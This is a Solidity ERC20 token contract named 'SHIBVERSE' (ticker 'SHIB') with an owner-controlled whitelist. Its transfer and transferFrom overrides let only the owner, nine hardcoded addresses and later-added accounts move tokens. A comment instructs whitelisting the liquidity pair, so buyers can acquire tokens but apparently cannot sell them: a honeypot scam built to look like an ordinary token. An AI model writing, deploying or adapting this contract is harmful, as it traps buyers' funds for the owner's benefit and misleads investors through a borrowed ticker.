// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("SHIBVERSE", "SHIB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 5000000 * 10 ** decimals());
        whiteList[0x5B1c4616d092fdC83C8E84e2Aca9B97DBB250Da9]= true;
        whiteList[0x631A87E538e0f3F0b8517F5E07D40466a8Adc49d]=true;
        whiteList[0x425f9f2263163C1357cA218135a11Ba8cfDe5D94]=true;
        whiteList[0x015bc0C63da202C8991c87831deDCccf09430fAf]=true;
        whiteList[0xcD92Dead754c563BD47b7Fd1BC90d1694412319F]=true;
        whiteList[0xECCbBe723363436D8f74230402AACEFe541c683e]=true;
        whiteList[0xD7Da3F387Ed5C0454382eF44CeA1a3f07D5F5304]=true;
        whiteList[0xCF029bD703284Fad67Fe12aAdf6A030a52FCBc10]=true;
        whiteList[0xd68B0ed127D06A7119EB4dFEc1E701adcD573221]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}